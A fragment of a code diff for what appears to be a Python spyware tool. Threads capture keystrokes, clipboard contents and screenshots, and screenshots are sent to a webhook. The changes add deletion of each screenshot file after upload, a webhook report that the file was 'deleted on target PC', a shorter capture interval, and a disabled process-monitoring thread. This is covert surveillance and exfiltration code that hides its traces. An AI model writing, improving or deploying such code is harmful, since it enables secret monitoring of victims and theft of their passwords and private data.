@@ -201,8 +201,11 @@ def screenshot():
         print(f"Screenshot saved as {filename}")  # Debug print
 
         send_to_webhook_pic(filename)
+        os.remove(filename)
+        print(f"Deleted {filename}")
+        send_to_webhook(f"Deleted {filename} on target PC")
 
-        time.sleep(30)  # Reduced for testing
+        time.sleep(10)  # Reduced for testing
 
 
 # Run kill.bat file at the start
@@ -236,7 +239,7 @@ process_thread = threading.Thread(target=monitor_processes, daemon=True)
 keystroke_thread.start()
 clipboard_thread.start()
 screenshot_thread.start()
-process_thread.start()
+#process_thread.start()
 
 # Set up the keyboard listener
 try:
